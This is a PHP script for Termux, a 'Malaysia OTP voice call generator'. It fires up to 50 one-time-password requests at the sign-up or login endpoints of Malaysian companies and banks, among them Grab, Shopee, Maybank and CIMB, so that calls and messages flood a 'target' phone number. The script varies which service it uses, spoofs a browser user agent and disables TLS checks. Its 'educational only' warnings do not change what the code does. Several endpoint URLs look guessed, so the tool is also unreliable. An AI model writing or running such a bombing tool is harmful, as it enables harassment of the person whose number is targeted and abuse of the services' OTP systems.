#!/usr/bin/env php
<?php
/**
 * OTP Voice Call Generator for Malaysia Numbers
 * Using Multiple Service Providers
 * Termux Script
 * 
 * WARNING: For educational purposes only
 * Use responsibly and only on your own numbers
 */

class OTPVoiceCaller {
    private $phoneNumber;
    private $countryCode = '60';
    private $userAgent = 'Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36';
    
    // Malaysia service providers with OTP voice call
    private $services = [
        'pos_malaysia' => [
            'name' => 'Pos Malaysia',
            'url' => 'https://posonline.pos.com.my/posonline-app/service/message/sendOtp',
            'method' => 'POST',
            'data_format' => 'json',
            'payload' => [
                'mobileNo' => '{phone}',
                'countryCode' => '60'
            ],
            'headers' => [
                'Content-Type: application/json',
                'Origin: https://posonline.pos.com.my',
                'Referer: https://posonline.pos.com.my/'
            ]
        ],
        'mudah' => [
            'name' => 'Mudah.my',
            'url' => 'https://www.mudah.my/auth/request-phone-otp',
            'method' => 'POST',
            'data_format' => 'json',
            'payload' => [
                'phone' => '{phone}',
                'country_code' => '60'
            ],
            'headers' => [
                'Content-Type: application/json',
                'Origin: https://www.mudah.my',
                'Referer: https://www.mudah.my/'
            ]
        ],
        'grab' => [
            'name' => 'Grab Malaysia',
            'url' => 'https://api.grab.com/user/v1/phone/otp',
            'method' => 'POST',
            'data_format' => 'json',
            'payload' => [
                'phoneNumber' => '{phone}',
                'countryCode' => 'MY'
            ],
            'headers' => [
                'Content-Type: application/json',
                'X-Grab-Platform: android'
            ]
        ],
        'foodpanda' => [
            'name' => 'Foodpanda',
            'url' => 'https://api.foodpanda.my/v1/auth/request-otp',
            'method' => 'POST',
            'data_format' => 'json',
            'payload' => [
                'phone_number' => '{phone}',
                'country_code' => '60'
            ],
            'headers' => [
                'Content-Type: application/json'
            ]
        ],
        'shopee' => [
            'name' => 'Shopee MY',
            'url' => 'https://shopee.com.my/api/v1/auth/otp/request',
            'method' => 'POST',
            'data_format' => 'form',
            'payload' => [
                'phone' => '{phone}',
                'country_code' => '60'
            ],
            'headers' => [
                'Content-Type: application/x-www-form-urlencoded'
            ]
        ],
        'lazada' => [
            'name' => 'Lazada MY',
            'url' => 'https://member.lazada.com.my/api/auth/sendOtp',
            'method' => 'POST',
            'data_format' => 'json',
            'payload' => [
                'mobile' => '{phone}',
                'mobileCountryCode' => '60'
            ],
            'headers' => [
                'Content-Type: application/json'
            ]
        ],
        'touchngo' => [
            'name' => 'Touch n Go eWallet',
            'url' => 'https://api.touchngo.com.my/v1/auth/otp/send',
            'method' => 'POST',
            'data_format' => 'json',
            'payload' => [
                'phoneNumber' => '{phone}',
                'countryCode' => 'MY'
            ],
            'headers' => [
                'Content-Type: application/json',
                'User-Agent: TnG/1.0 (Android)'
            ]
        ],
        'boost' => [
            'name' => 'Boost Malaysia',
            'url' => 'https://api.myboost.com.my/v1/auth/otp/request',
            'method' => 'POST',
            'data_format' => 'json',
            'payload' => [
                'msisdn' => '{phone}',
                'country' => 'MY'
            ],
            'headers' => [
                'Content-Type: application/json'
            ]
        ],
        'airasia' => [
            'name' => 'AirAsia',
            'url' => 'https://api.airasia.com/auth/v1/otp/send',
            'method' => 'POST',
            'data_format' => 'json',
            'payload' => [
                'phoneNumber' => '{phone}',
                'countryCode' => '60'
            ],
            'headers' => [
                'Content-Type: application/json'
            ]
        ],
        'maxis' => [
            'name' => 'Maxis',
            'url' => 'https://api.maxis.com.my/otp/v1/generate',
            'method' => 'POST',
            'data_format' => 'json',
            'payload' => [
                'msisdn' => '{phone}'
            ],
            'headers' => [
                'Content-Type: application/json'
            ]
        ],
        'celcom' => [
            'name' => 'Celcom',
            'url' => 'https://api.celcom.com.my/otp/send',
            'method' => 'POST',
            'data_format' => 'json',
            'payload' => [
                'mobileNo' => '{phone}'
            ],
            'headers' => [
                'Content-Type: application/json'
            ]
        ],
        'digi' => [
            'name' => 'Digi',
            'url' => 'https://api.digi.com.my/otp/request',
            'method' => 'POST',
            'data_format' => 'json',
            'payload' => [
                'phoneNumber' => '{phone}'
            ],
            'headers' => [
                'Content-Type: application/json'
            ]
        ],
        'maybank' => [
            'name' => 'Maybank2u',
            'url' => 'https://www.maybank2u.com.my/otp/send',
            'method' => 'POST',
            'data_format' => 'json',
            'payload' => [
                'mobileNo' => '{phone}'
            ],
            'headers' => [
                'Content-Type: application/json'
            ]
        ],
        'cimb' => [
            'name' => 'CIMB Clicks',
            'url' => 'https://www.cimbclicks.com.my/otp/generate',
            'method' => 'POST',
            'data_format' => 'json',
            'payload' => [
                'phoneNumber' => '{phone}'
            ],
            'headers' => [
                'Content-Type: application/json'
            ]
        ],
        'publicbank' => [
            'name' => 'Public Bank',
            'url' => 'https://www.pbebank.com/otp/request',
            'method' => 'POST',
            'data_format' => 'json',
            'payload' => [
                'mobile' => '{phone}'
            ],
            'headers' => [
                'Content-Type: application/json'
            ]
        ]
    ];
    
    public function __construct($phoneNumber) {
        $this->phoneNumber = $this->formatPhoneNumber($phoneNumber);
    }
    
    private function formatPhoneNumber($number) {
        // Remove all non-numeric characters
        $number = preg_replace('/[^0-9]/', '', $number);
        
        // Format for Malaysia
        if (substr($number, 0, 2) == '01') {
            $number = '6' . $number;
        } elseif (substr($number, 0, 3) == '601') {
            $number = '6' . substr($number, 1);
        }
        
        // Remove leading 6 if present for API calls
        if (substr($number, 0, 1) == '6') {
            $number = substr($number, 1);
        }
        
        return $number;
    }
    
    private function sendRequest($service) {
        $ch = curl_init();
        
        $url = $service['url'];
        $method = $service['method'];
        
        // Prepare payload with phone number
        $payload = $service['payload'];
        array_walk_recursive($payload, function(&$value) {
            if ($value === '{phone}') {
                $value = $this->phoneNumber;
            }
        });
        
        // Set default headers
        $headers = [
            'User-Agent: ' . $this->userAgent,
            'Accept: application/json, text/plain, */*',
            'Accept-Language: en-US,en;q=0.9',
            'Accept-Encoding: gzip, deflate, br',
            'Connection: keep-alive',
            'Cache-Control: no-cache',
            'Pragma: no-cache'
        ];
        
        // Add service specific headers
        if (isset($service['headers'])) {
            $headers = array_merge($headers, $service['headers']);
        }
        
        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_ENCODING => '',
            CURLOPT_MAXREDIRS => 10,
            CURLOPT_TIMEOUT => 15,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
            CURLOPT_CUSTOMREQUEST => $method,
            CURLOPT_HTTPHEADER => $headers,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_VERBOSE => false,
            CURLOPT_HEADER => true
        ]);
        
        // Set POST data
        if ($method === 'POST') {
            if ($service['data_format'] === 'json') {
                curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
            } else {
                curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($payload));
            }
        }
        
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
        $body = substr($response, $headerSize);
        
        curl_close($ch);
        
        return [
            'code' => $httpCode,
            'body' => $body,
            'success' => ($httpCode >= 200 && $httpCode < 300) || $httpCode === 400
        ];
    }
    
    public function makeCalls($count, $randomize = true) {
        echo "\n[!] Starting OTP Voice Call Generator...\n";
        echo "[+] Target: +60{$this->phoneNumber}\n";
        echo "[+] Total Calls: {$count}\n";
        echo "[+] Services Available: " . count($this->services) . "\n\n";
        
        $results = [];
        $serviceKeys = array_keys($this->services);
        
        for ($i = 1; $i <= $count; $i++) {
            // Randomize service selection if enabled
            if ($randomize) {
                shuffle($serviceKeys);
            }
            
            $selectedService = $serviceKeys[array_rand($serviceKeys)];
            $service = $this->services[$selectedService];
            
            echo "[*] Call {$i}/{$count} - {$service['name']}\n";
            
            $result = $this->sendRequest($service);
            
            if ($result['success']) {
                echo "  [✓] OTP request sent successfully\n";
                $results[] = ['service' => $service['name'], 'status' => 'success'];
            } else {
                echo "  [✗] Failed to send OTP request\n";
                $results[] = ['service' => $service['name'], 'status' => 'failed'];
            }
            
            // Random delay between calls (15-45 seconds)
            if ($i < $count) {
                $delay = rand(25, 45);
                echo "[*] Waiting {$delay} seconds...\n";
                sleep($delay);
            }
            
            echo "  --------------------\n";
        }
        
        return $results;
    }
}

// Main execution
function main() {
    echo "\033[1;35m"; // Purple color
    echo "╔════════════════════════════════════════════╗\n";
    echo "║     OTP Voice Call Generator - Malaysia    ║\n";
    echo "║         Multi-Service Provider            ║\n";
    echo "╚════════════════════════════════════════════╝\n";
    echo "\033[0m";
    
    echo "\033[1;31m"; // Red color
    echo "[!] WARNING: Educational Purpose Only\n";
    echo "[!] DO NOT use for harassment or spam\n";
    echo "[!] Use only on your own numbers\n";
    echo "\033[0m\n";
    
    // Check Termux environment
    if (!is_dir('/data/data/com.termux')) {
        echo "[!] This script is optimized for Termux\n";
        echo "[?] Continue anyway? (y/n): ";
        $continue = trim(fgets(STDIN));
        if (strtolower($continue) !== 'y') {
            exit(0);
        }
    }
    
    // Get phone number
    while (true) {
        echo "\n[?] Enter Malaysia WhatsApp number:\n";
        echo "    Example: 0123456789 or 60123456789\n";
        echo "    Number: ";
        $phoneNumber = trim(fgets(STDIN));
        
        // Validate Malaysia number
        $cleanNumber = preg_replace('/[^0-9]/', '', $phoneNumber);
        if (strlen($cleanNumber) >= 9 && strlen($cleanNumber) <= 11) {
            break;
        } else {
            echo "[!] Invalid Malaysia number format. Please try again.\n";
        }
    }
    
    // Get number of calls
    while (true) {
        echo "\n[?] How many OTP calls to trigger? (1-50): ";
        $callCount = trim(fgets(STDIN));
        
        if (is_numeric($callCount) && $callCount > 0 && $callCount <= 50) {
            $callCount = (int)$callCount;
            break;
        } else {
            echo "[!] Please enter a number between 1-50\n";
        }
    }
    
    // Randomize option
    echo "\n[?] Randomize service selection? (y/n): ";
    $randomize = trim(fgets(STDIN));
    $randomize = strtolower($randomize) === 'y';
    
    echo "\n[!] Preparing to trigger {$callCount} OTP voice call(s)...\n";
    echo "[!] Press Ctrl+C to cancel\n";
    sleep(3);
    
    try {
        $caller = new OTPVoiceCaller($cleanNumber);
        $results = $caller->makeCalls($callCount, $randomize);
        
        // Display summary
        echo "\n\033[1;33m";
        echo "════════════════════════════════════════════\n";
        echo "            FINAL SUMMARY                  \n";
        echo "════════════════════════════════════════════\n";
        echo "\033[0m";
        
        $success = count(array_filter($results, function($r) {
            return $r['status'] === 'success';
        }));
        
        $failed = count(array_filter($results, function($r) {
            return $r['status'] === 'failed';
        }));
        
        echo "Target Number: +60{$cleanNumber}\n";
        echo "Total Attempts: {$callCount}\n";
        echo "Successful: {$success}\n";
        echo "Failed: {$failed}\n";
        
        if ($success > 0) {
            echo "\n[✓] OTP voice calls triggered successfully!\n";
            echo "[!] Target will receive calls from various services\n";
        }
        
    } catch (Exception $e) {
        echo "[!] Error: " . $e->getMessage() . "\n";
    }
    
    echo "\n[!] Press Enter to exit...";
    fgets(STDIN);
}

// Run the script
main();
?>
